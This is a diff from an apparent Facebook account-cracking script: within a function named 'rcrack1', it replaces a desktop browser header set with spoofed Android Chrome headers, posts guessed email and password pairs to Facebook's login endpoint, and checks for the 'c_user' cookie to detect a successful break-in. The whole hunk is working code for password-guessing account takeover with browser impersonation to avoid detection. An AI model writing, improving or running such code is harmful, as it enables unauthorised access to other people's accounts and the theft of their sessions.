@@ -181,26 +181,25 @@ def rcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-######......𝑼𝒑𝒅𝒂𝒕𝒆 𝑺𝒚𝒔𝒕𝒆𝒎🌺.......########
-
-           header_freefb = {'authority': 'x.facebook.com',
-           'method': 'GET',
-           'scheme': 'https',
-    		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-   		 'accept-language': 'en-US,en;q=0.9',
-  		  'cache-control': 'max-age=0',
-  		  'sec-ch-prefers-color-scheme': 'light',
- 		   'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="112", "Google Chrome";v="112"',
-  		  'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="112.0.5622.199", "Google Chrome";v="112.0.5622.199"',
- 		   'sec-ch-ua-mobile': '?0',
-   		 'sec-ch-ua-platform': '"Linux"',
-		    'sec-ch-ua-platform-version': '""',
- 		   'sec-fetch-dest': 'document',
- 		   'sec-fetch-mode': 'navigate',
-		    'sec-fetch-site': 'none',
- 		   'sec-fetch-user': '?1',
- 		   'upgrade-insecure-requests': '1',
-		    'user-agent': pro}
+            header_freefb = {'authority': 'x.facebook.com',
+    'method': 'GET',
+    'scheme': 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'referer': 'https://x.facebook.com/',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"13.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
             lo = session.post('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
